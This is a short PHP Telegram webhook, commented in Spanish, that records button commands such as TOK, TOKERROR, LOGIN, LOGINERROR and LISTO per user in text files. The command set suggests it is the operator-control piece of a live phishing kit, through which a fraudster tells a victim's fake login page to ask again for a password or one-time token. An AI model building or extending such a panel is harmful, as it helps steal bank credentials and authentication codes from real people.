<?php
// ===== bot.php — Webhook Telegram =====
include("data.php");

$content = file_get_contents("php://input");
$update = json_decode($content, true);

if (isset($update['callback_query'])) {
    $data        = $update['callback_query']['data'];
    $callback_id = $update['callback_query']['id'];

    if (strpos($data, '|') !== false) {
        list($comando, $usuario) = explode('|', $data);

        $dir = __DIR__ . '/acciones';
        if (!file_exists($dir)) mkdir($dir, 0777, true);

        $archivo = $dir . '/' . basename($usuario) . '.txt';

        $map = [
            'TOK'        => '/TOK',
            'TOKERROR'   => '/TOKERROR',
            'LOGIN'      => '/LOGIN',
            'LOGINERROR' => '/LOGINERROR',
            'LISTO'      => '/LISTO',
            'ERROR'      => '/ERROR',
        ];

        file_put_contents($archivo, $map[$comando] ?? '/ERROR');

        file_get_contents("https://api.telegram.org/bot{$token}/answerCallbackQuery?" . http_build_query([
            'callback_query_id' => $callback_id,
            'text'              => "✅ Acción enviada para {$usuario}",
            'show_alert'        => false,
        ]));
    }
}
